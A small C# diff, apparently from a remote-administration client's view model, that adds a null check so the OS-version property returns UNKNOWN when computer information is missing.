@@ -51,7 +51,7 @@
         public string UserPath { get { return this.GenerateUserPath(); } }
         public string OutTraffic { get { return this.GetFancyTrafficName(this.clientSocket.OutTraffic); } }
         public string InTraffic { get { return this.GetFancyTrafficName(this.clientSocket.InTraffic); } }
-        public Maid.OsVersion OsVersion { get { return (Maid.OsVersion)this.computerInfo.OsVersion; } }
+        public Maid.OsVersion OsVersion { get { if (this.computerInfo != null) return (Maid.OsVersion)this.computerInfo.OsVersion; else return Maid.OsVersion.UNKNOWN; } }
 
         public ICommand CmdDisconnect { get; private set; }
         public ICommand CmdScreenshot { get; private set; }
